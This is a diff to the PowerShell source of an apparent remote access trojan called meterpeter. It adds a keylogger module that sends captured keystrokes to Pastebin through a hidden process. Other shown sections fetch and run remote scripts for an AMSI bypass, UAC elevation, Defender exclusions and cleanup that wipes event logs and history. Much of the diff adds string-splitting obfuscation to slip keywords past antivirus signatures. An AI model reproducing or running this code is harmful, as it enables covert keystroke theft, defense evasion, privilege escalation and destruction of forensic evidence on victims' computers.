+          write-host "`n`n   Description" -ForegroundColor Yellow
+          write-host "   -----------"
+          write-host "   This module takes the contents of keyl`ogger logfile (void.log)"
+          write-host "   and creates a new pastebin paste from it on the sellected account"
+          write-host "   each sellected time interval (120 sec) a max of 20 times (max pasts)"
+          write-host "   Recomended timeout: " -NoNewline;
+          write-host "3600 (one paste each hour)" -ForegroundColor Yellow -NoNewline
+          write-host " maxpastes: " -NoNewline
+          write-host "10 (max)" -ForegroundColor Yellow
+
+          write-host "`n`n   Modules   Description                  Remark" -ForegroundColor green;
+          write-host "   -------   -----------                  ------";
+          write-host "   Start     Send keys`trokes to pastebin  max of 20 pastes allowed by day";
+          write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
+          write-host "`n`n :meterpeter:keyl`ogger:PasteBin> " -NoNewline -ForeGroundColor Green;
+          $PasteBinChoise = Read-Host;
+          If($PasteBinChoise -ieq "Start")
+          {
+             $PasteSettings = "True"
+             Write-Host " - Input PastebinUsername  : " -ForeGroundColor Red -NoNewline
+             $PastebinUsername = Read-Host
+             If($PastebinUsername -eq $null)
+             {
+                $PasteSettings = "False"
+                $PastebinUsername = "missing pastebin acc name"
+                write-host "   => error: missing -PastebinUsername parameter" -ForegroundColor Red -BackgroundColor Black
+             }
+
+             Write-Host " - Input PastebinPassword  : " -ForeGroundColor Red -NoNewline
+             $PastebinPassword = Read-Host
+             If($PastebinPassword -eq $null)
+             {
+                $PasteSettings = "False"
+                write-host "   => error: missing -PastebinPassword parameter" -ForegroundColor Red -BackgroundColor Black
+             }
+
+             Write-Host " - Max of pastes to create : " -NoNewline
+             $MaxPastes = Read-Host
+             If(-not($MaxPastes) -or $MaxPastes -eq $null)
+             {
+                $MaxPastes = "15"
+                write-host "   => Max value missing, defaulting to: $MaxPastes" -ForegroundColor DarkYellow
+             }
+
+             Write-Host " - Create past each xxx sec: " -NoNewline
+             $TimeOut = Read-Host
+             If($MaxPastes -gt 1)
+             {
+                If($TimeOut -eq $null -or $TimeOut -lt 120)
+                {
+                   $TimeOut = "120"
+                   write-host "   => TimeOut value very low, defaulting to: $TimeOut" -ForegroundColor DarkYellow
+                }              
+             }
+             Else
+             {
+                If($TimeOut -eq $null)
+                {
+                   $TimeOut = "120"
+                   write-host "   => TimeOut value missing, defaulting to: $TimeOut" -ForegroundColor DarkYellow                 
+                }              
+             }
+
+             write-host " * Send ke`ystrokes to pastebin" -ForegroundColor Green
+             Write-Host "`n" #Module Banner
+             Write-Host "   Pastebin Username    : $PastebinUsername"
+             If($PastebinPassword -eq $null)
+             {
+                Write-Host "   PasteBin password    : " -NoNewline;
+                Write-Host "missing parameter declaration." -ForegroundColor Red -BackgroundColor Black;
+             }
+             Else
+             {
+                Write-Host "   PasteBin password    : " -NoNewline;
+                Write-Host "*********" -ForegroundColor Green;           
+             }
+             Write-Host "   Max Pastes To Create : $MaxPastes (max)"
+             Write-Host "   Create Paste TimeOut : each $TimeOut (seconds)"
+             Write-Host "   Keyl`ogger File Path  : `$Env:TMP\void.log`n"
+
+             If($PasteSettings -iMatch '^(True)$')
+             {
+                $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/SendToPasteBin.ps1`" -OutFile `"`$Env:TMP\SendToPasteBin.ps1`"|Unblock-file;Start-Process -WindowStyle hidden powershell -ArgumentList `"-File `$Env:TMP\SendToPasteBin.ps1 -PastebinUsername $PastebinUsername -PastebinPassword $PastebinPassword -MaxPastes $MaxPastes -TimeOut $TimeOut -Egg true`"";
+             }
+             Else
+             {
+                $Command = $Null;
+             }
+          }
+          Else
+          {
+             $PasteBinChoise = $null;
+             $Command = $Null;
+          }
+       }
        If($choise -ieq "Return" -or $choice -ieq "return" -or $choise -ieq "cls" -or $choise -ieq "Modules" -or $choise -ieq "modules" -or $choise -ieq "clear")
        {
-           $Command = $Null; 
+          $Command = $Null; 
        }
     }
 
@@ -2348,7 +2565,7 @@ While($Client.Connected)
     {
       ## Post-Exploiation Modules (red-team)
       write-host "`n`n   Description:" -ForegroundColor Yellow;
-      write-host "   Post exploitation manager"
+      write-host "   Post expl`oitation manager"
       write-host "`n`n   Modules     Description" -ForegroundColor green;
       write-host "   -------     -----------";
       write-host "   Stream      Stream remote host desktop live";
@@ -2364,7 +2581,7 @@ While($Client.Connected)
       write-host "   Passwords   Dump (vault|dpapi|files|WDigest)";
       write-host "   BruteAcc    Brute-force user account password";
       write-host "   PhishCred   Promp remote user for logon creds";
-      write-host "   AMSIpatch   Disable AMS1 within current process";
+      write-host "   AMS`Ipatch   Disable AMS1 within current process";
       write-host "   Allprivs    Enable all current shell privileges";
       write-host "   Exclusions  Manage Windows Defender exclusions";
       write-host "   LockPC      Lock remote host WorkStation";
@@ -2594,9 +2811,12 @@ While($Client.Connected)
       }
       If($choise -ieq "Exclusions")
       {
+        $Obione = "Ex@clu@sionPa@th" -replace '@',''
+        $Obitwo = "@Ex@clus@io@nPr@oc@es@s" -replace '@',''
+        $Obitre = "Ex@cl@us@@ion@E@xt@en@@sion" -replace '@',''
         write-host "`n`n   Description:" -ForegroundColor Yellow;
         write-host "   Manage Windows Defender exclusions (query, create, delete)."
-        write-host "   Types: ExclusionExtension, ExclusionProcess, ExclusionPath,ExclusionIpAddress."
+        write-host "   Types: $Obitre, $Obitwo, $Obione,ExclusionIpAddress."
         write-host "   The files covered by the exclusion definition will be excluded from Defender"
         write-host "   Real-time protection, proactive monitoring, Scheduled scans, On-demand scans."
         write-host "   Remark: URI will be upload to %TMP% and not deleted after execution." -ForegroundColor Yellow
@@ -2621,11 +2841,11 @@ While($Client.Connected)
         }
         If($WD_choise -ieq "Create")
         {
-           write-host " - ExclusionExtension, ExclusionProcess, ExclusionPath, ExclusionIpAddress: " -ForeGroundColor Red -NoNewline;
+           write-host " - $Obitre, $Obitwo, $Obione, Exc`lusionIpAd`dress: " -ForeGroundColor Red -NoNewline;
            $ExcludeType = Read-Host;
            If(-not($ExcludeType) -or $ExcludeType -eq $null)
            {
-              $ExcludeType = "ExclusionPath"
+              $ExcludeType = "$Obione"
            }
            write-host " - Exclude from Defender scans: " -ForeGroundColor Red -NoNewline;
            $ExcludePath = Read-Host;
@@ -2640,11 +2860,11 @@ While($Client.Connected)
         }
         If($WD_choise -ieq "UrlExec")
         {
-           write-host " - ExclusionExtension, ExclusionProcess, ExclusionPath, ExclusionIpAddress: " -ForeGroundColor Red -NoNewline;
+           write-host " - $Obitre, $Obitwo, $Obione, Exclu`sionIpAd`dress: " -ForeGroundColor Red -NoNewline;
            $ExcludeType = Read-Host;
            If(-not($ExcludeType) -or $ExcludeType -eq $null)
            {
-              $ExcludeType = "ExclusionPath"
+              $ExcludeType = "$Obione"
            }
            write-host " - The URL to be downloaded: " -NoNewline;
            $UriLink = Read-Host;
@@ -2672,11 +2892,11 @@ While($Client.Connected)
         }
         If($WD_choise -ieq "Delete")
         {
-           write-host " - ExclusionExtension, ExclusionProcess, ExclusionPath, ExclusionIpAddress: " -ForeGroundColor Red -NoNewline;
+           write-host " - $Obitre, $Obitwo, $Obione, Exclu`sionIpAd`dress: " -ForeGroundColor Red -NoNewline;
            $ExcludeType = Read-Host;
            If(-not($ExcludeType) -or $ExcludeType -eq $null)
            {
-              $ExcludeType = "ExclusionPath"
+              $ExcludeType = "$Obione"
            }
            write-host " - Exclusion entry to delete: " -ForeGroundColor Red -NoNewline;
            $ExcludePath = Read-Host;
@@ -2745,31 +2965,32 @@ While($Client.Connected)
         write-host "`n`n   Description:" -ForegroundColor Yellow;
         write-host "   This cmdlet attempts to disable AMS1 string scanning within"
         write-host "   the current process context (terminal console) It also allow is"
-        write-host "   users to execute any inputed script trough AMS1 bypass technic.";
+        write-host "   users to execute any inputed script trough AMS1 bypa`ss technic.";
         write-host "`n`n   Modules     Description                            Privileges Required" -ForegroundColor green;
         write-host "   -------     -----------                            -------------------";
         write-host "   Console     Disable AMS1 within current process    UserLand";
-        write-host "   FilePath    Execute input script trough bypass     UserLand";
-        write-host "   PayloadUrl  Download\Execute script trough bypass  UserLand";
+        write-host "   FilePath    Execute input script trough bypa`ss     UserLand";
+        write-host "   PayloadUrl  Download\Execute script trough bypa`ss  UserLand";
         write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow;
-        write-host "`n`n :meterpeter:Post:AMSIPatch> " -NoNewline -ForeGroundColor Green;
+        write-host "`n`n :meterpeter:Post:AMS`IPatch> " -NoNewline -ForeGroundColor Green;
         $Patch_choise = Read-Host;
         If($Patch_choise -ieq "Console")
         {
-           write-host "`n  Technic  Description" -ForegroundColor DarkYellow
-           write-host "  -------  -----------"
-           write-host "  2        FORC`E_AM`SI_ERROR"
-           write-host "  3        AM`SI_UT`ILS_P`AT`CH`n"
+           write-host " * Disable AMS1 within current process`n" -ForegroundColor Green
+           write-host "`n   Technic  Description" -ForegroundColor DarkYellow
+           write-host "   -------  -----------"
+           write-host "   2        FORC`E_AM`SI_ERROR"
+           write-host "   3        AM`SI_UT`ILS_P`AT`CH`n"
 
-           write-host " - Bypass technic to use (2|3): " -ForeGroundColor Red -NoNewline;
+           write-host " - Bypa`ss technic to use (2|3)  : " -ForeGroundColor Red -NoNewline;
            $Technic = Read-Host;
-           $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bypass/Invoke-Bypass.ps1`" -OutFile `"`$Env:TMP\Invoke-Bypass.ps1`"|Unblock-File;powershell -file `$Env:TMP\Invoke-Bypass.ps1 -technic `"$Technic`" -Egg true"
+           $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Invoke-Bypass.ps1`" -OutFile `"`$Env:TMP\Invoke-Bypass.ps1`"|Unblock-File;powershell -file `$Env:TMP\Invoke-Bypass.ps1 -technic `"$Technic`" -Egg true"
         }
         If($Patch_choise -ieq "FilePath")
         {
-           write-host " - Bypass technic to use (2|3)  : " -ForeGroundColor Red -NoNewline;
+           write-host " - Bypa`ss technic to use (2|3)  : " -ForeGroundColor Red -NoNewline;
            $Technic = Read-Host;
-           write-host " - Execute script trough bypass : " -NoNewline;
+           write-host " - Execute script trough byp`ass : " -NoNewline;
            $FilePath = Read-Host;
            write-host " - Exec script with args? (y|n) : " -NoNewline;
            $MArs = Read-Host;
@@ -2787,9 +3008,9 @@ While($Client.Connected)
         }
         If($Patch_choise -ieq "PayloadUrl")
         {
-           write-host " - Bypass technic to use (2|3)  : " -ForeGroundColor Red -NoNewline;
+           write-host " - Byp`ass technic to use (2|3)  : " -ForeGroundColor Red -NoNewline;
            $Technic = Read-Host;
-           write-host " - The Payload Url link         : " -NoNewline;
+           write-host " - The Paylo`ad Url link         : " -NoNewline;
            $PayloadUrl = Read-Host;
            write-host " - Exec script with args? (y|n) : " -NoNewline;
            $MArs = Read-Host;
@@ -2815,7 +3036,7 @@ While($Client.Connected)
       If($choise -ieq "FindEop" -or $choise -ieq "EOP")
       {
         write-host "`n`n   Remark:" -ForegroundColor Yellow;
-        write-host "   None of the modules in this sub-category will try to exploit any";
+        write-host "   None of the modules in this sub-category will try to exp`loit any";
         write-host "   weak permissions found. They will only report the vulnerability.";
         write-host "   Agressive scans takes 3 to 8 minuts depending of scan sellected." -ForeGroundColor DarkYellow
         write-host "`n`n   Modules   Description                       Privileges Required" -ForegroundColor green;
@@ -2866,8 +3087,10 @@ While($Client.Connected)
         }
         If($my_choise -ieq "RottenP" -or $my_choise -ieq "rotten")
         {
+          $myLine = "SeIm" + "person" + "atePriv" + "ilege" -join ''
+          $DebugPriv = "SeD" + "ebugPriv" + "ileges" -join ''
           write-host " * Searching rotten potato vuln settings.`n" -ForegroundColor Green
-          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){echo `"   `> Error: this module cant not run with admin Privileges`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{cmd /R whoami /priv|findstr /i /C:`"SeImpersonatePrivilege`" /C:`"SeAssignPrimaryPrivilege`" /C:`"SeTcbPrivilege`" /C:`"SeBackupPrivilege`" /C:`"SeRestorePrivilege`" /C:`"SeCreateTokenPrivilege`" /C:`"SeLoadDriverPrivilege`" /C:`"SeTakeOwnershipPrivilege`" /C:`"SeDebugPrivileges`" `> dellog.txt;`$check_ACL = get-content dellog.txt|findstr /i /C:`"Enabled`";If(`$check_ACL){echo `"   Rotten Potato Vulnerable Settings Found [Enabled] ..`" `> test.txt;Get-Content test.txt;Remove-Item test.txt -Force;Get-Content dellog.txt;remove-item dellog.txt -Force}else{echo `"   `> Error: none weak permissions found [ Rotten Potato ] ..`" `> test.txt;Get-Content test.txt;Remove-Item test.txt -Force;Remove-Item dellog.txt -Force}}";
+          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){echo `"   `> Error: this module cant not run with admin Privileges`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{cmd /R whoami /priv|findstr /i /C:`"$myLine`" /C:`"SeAssignPrimaryPrivilege`" /C:`"SeTcbPrivilege`" /C:`"SeBackupPrivilege`" /C:`"SeRestorePrivilege`" /C:`"SeCreateTokenPrivilege`" /C:`"SeLoadDriverPrivilege`" /C:`"SeTakeOwnershipPrivilege`" /C:`"$DebugPriv`" `> dellog.txt;`$check_ACL = get-content dellog.txt|findstr /i /C:`"Enabled`";If(`$check_ACL){echo `"   Rotten Potato Vulnerable Settings Found [Enabled] ..`" `> test.txt;Get-Content test.txt;Remove-Item test.txt -Force;Get-Content dellog.txt;remove-item dellog.txt -Force}else{echo `"   `> Error: none weak permissions found [ Rotten Potato ] ..`" `> test.txt;Get-Content test.txt;Remove-Item test.txt -Force;Remove-Item dellog.txt -Force}}";
        }
         If($my_choise -ieq "Return" -or $my_choise -ieq "return" -or $my_choise -ieq "cls" -or $my_choise -ieq "Modules" -or $my_choise -ieq "modules" -or $my_choise -ieq "clear")
         {
@@ -2992,13 +3215,13 @@ While($Client.Connected)
          If($track_choise -ieq "Query")
          {
             Write-Host " * Query main eventvwr logs" -ForegroundColor Green
-            $Command = "Get-WinEvent -ListLog * -ErrorAction Ignore|Where-Object { `$_.LogName -iMatch '(AMSI|UAC|`^Application`$|DeviceGuard/Operational`$|Regsvr32/Operational`$|Windows Defender|WMI-Activity/Operational`$|AppLocker/Exe and DLL`$|AppLocker/MSI and Script`$|`^windows powershell`$|`^Microsoft-Windows-PowerShell/Operational`$|Bits-Client/Operational`$|TCPIP)' -and `$_.LogName -iNotMatch '(/Admin)$'}|Format-Table -AutoSize `> Event.txt;Get-content Event.txt;Remove-Item Event.txt -Force";
+            $Command = "Get-WinEvent -ListLog * -ErrorAction Ignore|Where-Object { `$_.LogName -iMatch '(AMS`I|UAC|`^Application`$|DeviceGuard/Operational`$|Regsvr32/Operational`$|Windows Defender|WMI-Activity/Operational`$|AppLocker/Exe and DLL`$|AppLocker/MSI and Script`$|`^windows powershell`$|`^Microsoft-Windows-PowerShell/Operational`$|Bits-Client/Operational`$|TCPIP)' -and `$_.LogName -iNotMatch '(/Admin)$'}|Format-Table -AutoSize `> Event.txt;Get-content Event.txt;Remove-Item Event.txt -Force";
          }
          If($track_choise -ieq "clean")
          {
             Write-Host " * Cleanning remote system tracks ..`n" -ForegroundColor Green;
             $MeterClient = "$payload_name" + ".ps1" -Join ''
-            $Command = "echo `"[*] Cleaning Temporary folder artifacts ..`" `> `$Env:TMP\clean.meterpeter;Remove-Item -Path `"`$Env:TMP\*`" -Include *.exe,*.bat,*.vbs,*.tmp,*.log,*.ps1,*.dll,*.lnk,*.inf,*.png,*.zip -Exclude *$MeterClient* -EA SilentlyContinue -Force -Recurse;echo `"[*] Cleaning Recent directory artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;Remove-Item -Path `"`$Env:APPDATA\Microsoft\Windows\Recent\*`" -Include *.exe,*.bat,*.vbs,*.log,*.ps1,*.dll,*.inf,*.lnk,*.png,*.txt,*.zip -Exclude desktop.ini -EA SilentlyContinue -Force -Recurse;echo `"[*] Cleaning Recent documents artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;cmd /R REG DELETE `"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs`" /f|Out-Null;cmd /R REG ADD `"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs`" /ve /t REG_SZ /f|Out-Null;echo `"[*] Cleaning DNS Resolver cache artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;cmd /R ipconfig /flushdns|Out-Null;If(Get-Command `"Clear-RecycleBin`" -EA SilentlyContinue){echo `"[*] Cleaning recycle bin folder artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;Start-Process -WindowStyle Hidden powershell -ArgumentList `"Clear-RecycleBin -Force`" -Wait}Else{echo `"[*] Cleaning recycle bin folder artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;echo `"   `> Error: 'Clear-RecycleBin' not found ..`" `>`> `$Env:TMP\clean.meterpeter};echo `"[*] Cleaning ConsoleHost_history artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;`$CleanPSLogging = (Get-PSReadlineOption -EA SilentlyContinue).HistorySavePath;echo `"MeterPeterNullArtifacts`" `> `$CleanPSLogging;`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){echo `"[*] Cleaning Cache of plugged USB devices ..`" `>`> `$Env:TMP\clean.meterpeter;cmd /R REG DELETE `"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`" /f|Out-Null;cmd /R REG ADD `"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`" /ve /t REG_SZ /f|Out-Null;echo `"[-] Cleaning Eventvwr logfiles from snapin ..`" `>`> `$Env:TMP\clean.meterpeter;`$PSlist = wevtutil el | Where-Object {`$_ -iMatch '(AMSI/Debug|UAC|Powershell|BITS|Windows Defender|WMI-Activity/Operational|AppLocker/Exe and DLL|AppLocker/MSI and Script|TCPIP/Operational)' -and `$_ -iNotMatch '(/Admin)`$'};ForEach(`$PSCategorie in `$PSlist){wevtutil cl `"`$PSCategorie`"|Out-Null;echo `"    deleted: `$PSCategorie`" `>`> `$Env:TMP\clean.meterpeter}}Else{echo `"[x] Cleaning Eventvwr logfiles from snapin ..`" `>`> `$Env:TMP\clean.meterpeter;echo `"    => Error: Administrator privileges required!`" `>`> `$Env:TMP\clean.meterpeter};Get-Content -Path `$Env:TMP\clean.meterpeter;Remove-Item -Path `$Env:TMP\clean.meterpeter -Force"
+            $Command = "echo `"[*] Cleaning Temporary folder artifacts ..`" `> `$Env:TMP\clean.meterpeter;Remove-Item -Path `"`$Env:TMP\*`" -Include *.exe,*.bat,*.vbs,*.tmp,*.log,*.ps1,*.dll,*.lnk,*.inf,*.png,*.zip -Exclude *$MeterClient* -EA SilentlyContinue -Force -Recurse;echo `"[*] Cleaning Recent directory artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;Remove-Item -Path `"`$Env:APPDATA\Microsoft\Windows\Recent\*`" -Include *.exe,*.bat,*.vbs,*.log,*.ps1,*.dll,*.inf,*.lnk,*.png,*.txt,*.zip -Exclude desktop.ini -EA SilentlyContinue -Force -Recurse;echo `"[*] Cleaning Recent documents artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;cmd /R REG DELETE `"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs`" /f|Out-Null;cmd /R REG ADD `"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs`" /ve /t REG_SZ /f|Out-Null;echo `"[*] Cleaning DNS Resolver cache artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;cmd /R ipconfig /flushdns|Out-Null;If(Get-Command `"Clear-RecycleBin`" -EA SilentlyContinue){echo `"[*] Cleaning recycle bin folder artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;Start-Process -WindowStyle Hidden powershell -ArgumentList `"Clear-RecycleBin -Force`" -Wait}Else{echo `"[*] Cleaning recycle bin folder artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;echo `"   `> Error: 'Clear-RecycleBin' not found ..`" `>`> `$Env:TMP\clean.meterpeter};echo `"[*] Cleaning ConsoleHost_history artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;`$CleanPSLogging = (Get-PSReadlineOption -EA SilentlyContinue).HistorySavePath;echo `"MeterPeterNullArtifacts`" `> `$CleanPSLogging;`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){echo `"[*] Cleaning Cache of plugged USB devices ..`" `>`> `$Env:TMP\clean.meterpeter;cmd /R REG DELETE `"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`" /f|Out-Null;cmd /R REG ADD `"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`" /ve /t REG_SZ /f|Out-Null;echo `"[-] Cleaning Eventvwr logfiles from snapin ..`" `>`> `$Env:TMP\clean.meterpeter;`$PSlist = wevtutil el | Where-Object {`$_ -iMatch '(AM`SI/Debug|UAC|Powershell|BITS|Windows Defender|WMI-Activity/Operational|AppLocker/Exe and DLL|AppLocker/MSI and Script|TCPIP/Operational)' -and `$_ -iNotMatch '(/Admin)`$'};ForEach(`$PSCategorie in `$PSlist){wevtutil cl `"`$PSCategorie`"|Out-Null;echo `"    deleted: `$PSCategorie`" `>`> `$Env:TMP\clean.meterpeter}}Else{echo `"[x] Cleaning Eventvwr logfiles from snapin ..`" `>`> `$Env:TMP\clean.meterpeter;echo `"    => Error: Administrator privileges required!`" `>`> `$Env:TMP\clean.meterpeter};Get-Content -Path `$Env:TMP\clean.meterpeter;Remove-Item -Path `$Env:TMP\clean.meterpeter -Force"
          }
          If($track_choise -ieq "Paranoid") 
          {
@@ -3008,7 +3231,7 @@ While($Client.Connected)
             Write-Host " - Delete Restore Points? (y|n)  : " -ForeGroundColor Red -NoNewline
             $RPointsStatus = Read-Host;If($RPointsStatus -iMatch '^(y|yes|true)$'){$RStdout = "True"}Else{$RStdout = "False"}
             Write-Host " * Cleanning system tracks." -ForegroundColor Green
-            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/CleanTracks.ps1`" -OutFile `"`$Env:TMP\CleanTracks.ps1`"|Out-Null;powershell -exec bypass -File `$Env:TMP\CleanTracks.ps1 -CleanTracks Paranoid -Verb $stdout -DelRestore $RStdout;Remove-Item -Path `$Env:TMP\CleanTracks.ps1 -EA SilentlyContinue -Force"
+            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/CleanTracks.ps1`" -OutFile `"`$Env:TMP\CleanTracks.ps1`"|Out-Null;powershell -File `$Env:TMP\CleanTracks.ps1 -CleanTracks Paranoid -Verb $stdout -DelRestore $RStdout;Remove-Item -Path `$Env:TMP\CleanTracks.ps1 -EA SilentlyContinue -Force"
          }
          If($track_choise -ieq "Return" -or $track_choise -ieq "cls" -or $track_choise -ieq "modules" -or $track_choise -ieq "clear")
          {
@@ -3126,7 +3349,7 @@ While($Client.Connected)
         write-host "   -------     -----------                   ------------------"
         write-host "   getadmin    Escalate client privileges    UserLand"
         write-host "   Delete      Delete getadmin artifacts     UserLand"
-        write-host "   UACpriv     use runas to spawn UAC diag   UserLand"
+        write-host "   UACpriv     use runa[s] to spawn UAC diag UserLand"
         write-host "   CmdLine     Uac execute command elevated  UserLand"
         write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow
         write-host "`n`n :meterpeter:Post:Escalate> " -NoNewline -ForeGroundColor Green
@@ -3146,8 +3369,8 @@ While($Client.Connected)
            }
            Else
            {
-              write-host " * Using RUNAS to elevate session!`n" -ForeGroundColor Green
-              $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){echo `"   `> Error: Abort, session allready running under Administrator token ..`" `> `$Env:TMP\EOPsettings.log;Get-Content `$Env:TMP\EOPsettings.log;Remove-Item -Path `$Env:TMP\EOPsettings.log -Force}Else{iwr -Uri https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/UACeop.ps1 -OutFile `$Env:TMP\UACeop.ps1|Out-Null;((Get-Content -Path `$Env:TMP\UACeop.ps1 -Raw) -Replace `"StartTime='20:20'`",`"StartTime='$StartTime'`")|Set-Content -Path `$Env:TMP\UACeop.ps1;echo `"   `> Triger EOP at: $StartTime hours.`" `> `$Env:TMP\EOPsettings.log;echo `"   `> Exit meterpeter connection and start a new listenner`" `>`> `$Env:TMP\EOPsettings.log;echo `"   `> using the same LHOST+LPORT to recive the connection.`" `>`> `$Env:TMP\EOPsettings.log;Get-Content `$Env:TMP\EOPsettings.log;Remove-Item -Path `$Env:TMP\EOPsettings.log -Force;Start-Process -WindowStyle hidden powershell.exe -ArgumentList `"-file `$Env:TMP\UACeop.ps1`"}"
+              write-host " * Using RU`NAS to elevate session!`n" -ForeGroundColor Green
+              $Command = "cd `$Env:TMP;`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){echo `"   `> Error: Abort, session allready running under Administrator token ..`" `> `$Env:TMP\EOPsettings.log;Get-Content `$Env:TMP\EOPsettings.log;Remove-Item -Path `$Env:TMP\EOPsettings.log -Force}Else{Remove-Item -Path `$Env:TMP\Programdata.log -force;iwr -Uri https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/UACeop.ps1 -OutFile `$Env:TMP\UACeop.ps1|Unblock-File;echo `"   `> Triger EOP function at: $StartTime hours.`" `> `$Env:TMP\EOPsettings.log;echo `"   Exit meterpeter connection [now] and start a new listenner`" `>`> `$Env:TMP\EOPsettings.log;echo `"   Using the same LHOST+LPORT to recive the connection back.`" `>`> `$Env:TMP\EOPsettings.log;Get-Content `$Env:TMP\EOPsettings.log;Remove-Item -Path `$Env:TMP\EOPsettings.log -Force;Start-Process -WindowStyle hidden powershell -ArgumentList `"-file UACeop.ps1 -starttime $StartTime -attacker ${Local_Host}:${Local_Port} -autodel`"}"
            }
         }
         If($Escal_choise -ieq "GetAdmin")
@@ -3181,7 +3404,7 @@ While($Client.Connected)
           If(-not($DelayTime) -or $DelayTime -lt "30"){$DelayTime = "30"}
           If(-not($ExecRatLoop) -or $ExecRatLoop -lt "1"){$ExecRatLoop = "1"}
           Write-Host " * Elevate session from UserLand to Administrator!" -ForegroundColor Green
-          Write-Host "   => Downloading: UACBypassCMSTP from GitHub into %TMP% ..`n" -ForeGroundColor Blue
+          Write-Host "   => Downloading: UACBy`passCMSTP from GitHub into %TMP% ..`n" -ForeGroundColor Blue
           Start-Sleep -Seconds 1
 
           #Build output DataTable!
@@ -3224,7 +3447,7 @@ While($Client.Connected)
           Write-Host "$Local_Host" -ForegroundColor Green -BackgroundColor Black -NoNewline;
           Write-Host " lport:" -ForegroundColor Red -BackgroundColor Black -NoNewline;
           Write-Host "$Local_Port" -ForegroundColor Green -BackgroundColor Black -NoNewline;
-          Write-Host " obfuscation:bxor" -ForegroundColor Red -BackgroundColor Black;
+          Write-Host " obfuscat`ion:bxor" -ForegroundColor Red -BackgroundColor Black;
 
           #Execute Command Remote
           Start-Sleep -Seconds 1;$TriggerSettings = "$Local_Host"+":"+"$Local_Port" -join ''
@@ -3232,7 +3455,7 @@ While($Client.Connected)
         }
         If($Escal_choise -ieq "Delete" -or $Escal_choise -ieq "del")
         {
-          Write-Host " Delete privilege escalation artifacts left behind." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n";
+          Write-Host " Delete privil`ege escalation artifacts left behind." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n";
           $Command = "Stop-Process -Name cmstp -EA SilentlyContinue;Remove-Item -Path `"`$Env:TMP\*`" -Include *.log,*.ps1,*.dll,*.inf,*.bat,*.vbs -Exclude *Update-* -EA SilentlyContinue -Force|Select -SkipLast 1;echo `"   [i] meterpeter EOP artifacts successfuly deleted.`" `> logme.log;Get-Content logme.log;Remove-Item -Path logme.log";
         }
         If($Escal_choise -ieq "CmdLine")
@@ -3240,8 +3463,8 @@ While($Client.Connected)
            Write-Host " * Spawn UAC gui to run cmdline elevated." -ForegroundColor Green
            write-host " - Input cmdline to run elevated: " -ForeGroundColor Red -NoNewline
            $ElevatedCmdLine = Read-Host
-
-           $Command = "powershell -C `"Start-Process $Env:WINDIR\system32\cmd.exe -ArgumentList '$ElevatedCmdLine' -verb RunAs`";echo `"`n[i] Executing: '$ElevatedCmdLine'`" `> `$Env:TMP\sdhsdc.log;Get-Content `$Env:TMP\sdhsdc.log;Remove-Item -Path `"`$Env:TMP\sdhsdc.log`" -Force"
+           $Myrunes = "r" + "una" + "s" -join ''
+           $Command = "powershell -C `"Start-Process $Env:WINDIR\system32\cmd.exe -ArgumentList '$ElevatedCmdLine' -verb $Myrunes`";echo `"`n[i] Executing: '$ElevatedCmdLine'`" `> `$Env:TMP\sdhsdc.log;Get-Content `$Env:TMP\sdhsdc.log;Remove-Item -Path `"`$Env:TMP\sdhsdc.log`" -Force"
         }
         If($Escal_choise -ieq "Return" -or $Escal_choise -ieq "cls" -or $Escal_choise -ieq "modules" -or $Escal_choise -ieq "clear")
         {
@@ -3255,7 +3478,7 @@ While($Client.Connected)
       If($choise -ieq "Persist" -or $choise -ieq "persistance")
       {
         write-host "`n`n   Requirements:" -ForegroundColor Yellow;
-        write-host "   Client (payload) must be deployed in target %TEMP% folder.";
